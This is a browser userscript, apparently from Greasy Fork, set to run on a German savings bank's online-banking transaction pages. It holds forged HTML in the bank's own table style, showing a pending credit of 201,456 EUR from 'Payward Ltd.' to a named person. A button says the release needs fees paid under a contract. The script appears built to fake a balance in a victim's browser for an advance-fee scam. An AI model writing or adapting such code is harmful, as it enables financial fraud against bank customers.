// ==UserScript==
// @name         Vertragssignature Wurzbacher
...
// @match        https://www.ksk-saale-orla.de/de/home/onlinebanking/umsaetze/umsaetze.html*
// @match        https://www.ksk-saale-orla.de/de/home/onlinebanking/finanzstatus.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/451433/Vertragssignature%20Wurzbacher.user.js
// @updateURL https://update.greasyfork.org/scripts/451433/Vertragssignature%20Wurzbacher.meta.js
// ==/UserScript==
...
(function() {
    ...
    var xHTML = '<table role="table" aria-label="Gebuchte Umsätze" aria-describedby="umsatz" class="btable pfm-umsatz no-2nd-row top-align hover-over-area actionicon-noborder toggle-table-row toggle-table-group spacious "><caption class="offscreen" id="umsatz">Die Tabelle zeigt Ihnen die Umsätze des gewählten Kontos bzw. Depots im gewählten Zeitraum.</caption><tbody><tr class="tableheader noborder" id="aria01662662227681-0" role="heading" aria-level="2"><td class="nowrap" id="aria01662662227681-0-td">Spezialauftrag (1)</td><td class="right nowrap" colspan="3"><div class="data"><div class="datatable"><div class="label"><em>**</em></div><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">201.456</span><span aria-hidden="true" class="balance-decimal plus">,48&nbsp;EUR</span><span aria-hidden="false" class="offscreen">10,00 EUR</span></div></div></div></td></tr><tr class="tablerowodd toggle-table-row-open hoverable" id="aria01662662227681-0-0" role="region" aria-labelledby="aria01662662227681-0-td" aria-level="3" aria-expanded="true" aria-controls="aria01662662227681-0-td4 "><td class="left"><div class="payment"><span class="title">Payward Ltd.</span><span class="details">20.09.2022 | WD3746 A1-DE-8812031827 Wurzbacher, Denis</span></div></td><td class="nowrap"><div class="bcategory">&nbsp;</div></td><td class="right"><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">201.456</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">10,00 EUR</span></div></td><td id="aria01662662227681-0-td4"><div class=""><div class="ficon icon-if5_symbol_banking_6"><input type="submit" name="PBtSENJbhBjEfdZv" title="Freigabe nötig. Bedingung: Begleichung der Gebuehren nach Vertrag" value="Freigabe nötig. Bedingung: Begleichung der Gebuehren nach Vertrag Paywa (..)" onclick="();" class="" role="link" data-tracked="true"></div></div></td></tr></tbody></table>';
